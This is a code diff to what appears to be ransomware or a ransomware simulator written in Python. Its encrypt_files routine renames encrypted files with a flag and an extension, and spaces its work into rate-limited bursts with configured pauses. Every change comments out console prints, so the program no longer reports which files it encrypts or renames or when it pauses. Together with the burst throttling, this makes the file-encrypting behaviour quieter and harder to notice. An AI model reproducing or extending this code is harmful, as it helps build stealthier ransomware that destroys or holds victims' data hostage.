@@ -235,7 +235,7 @@ def encrypt_files(key, start_dirs):
 
                 encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
                 rename(file, encrypted_name)
-                print("File changed from " + file + " to " + encrypted_name)  # keep!
+                # print("File changed from " + file + " to " + encrypted_name)  # keep!
 
                 file_counter += 1
 
@@ -243,22 +243,22 @@ def encrypt_files(key, start_dirs):
                 if rate > 0 and rate * burst_running < file_sizes:  # burst rate is limited
                     # if r * b < f then r * (b + n) = f, thus n = f/r - b
                     even_out = (file_sizes / rate) - burst_running
-                    print("sleeping for", even_out, "to limit rate")
+                    # print("sleeping for", even_out, "to limit rate")
                     sleep(even_out)
 
                 if duration > 0:  # burst duration is limited
                     reset_burst = False
                     if limit_files:
-                        print("bursting for", file_counter, "files")
+                        # print("bursting for", file_counter, "files")
                         if file_counter >= duration:
                             reset_burst = True
-                            print("sleeping for", config["BURST"]["pause"])
+                            # print("sleeping for", config["BURST"]["pause"])
                             sleep(int(config["BURST"]["pause"]))
                     else:  # limit seconds instead of files
-                        print("bursting for", time() - burst_start, "seconds")
+                        # print("bursting for", time() - burst_start, "seconds")
                         if time() - burst_start >= duration:
                             reset_burst = True
-                            print("sleeping for", config["BURST"]["pause"])
+                            # print("sleeping for", config["BURST"]["pause"])
                             sleep(int(config["BURST"]["pause"]))
                     if reset_burst:
                         file_counter = 0
@@ -277,7 +277,7 @@ def decrypt_files(key, start_dirs):
                 abs_dir = path.dirname(file)
                 file_original = ".".join(path.basename(file).split(".")[:-2])
                 rename(file, path.join(abs_dir, file_original))
-                print("File changed from " + file + " to " + file_original)
+                # print("File changed from " + file + " to " + file_original)
 
 
 def run(encrypt, absolute_paths=None):
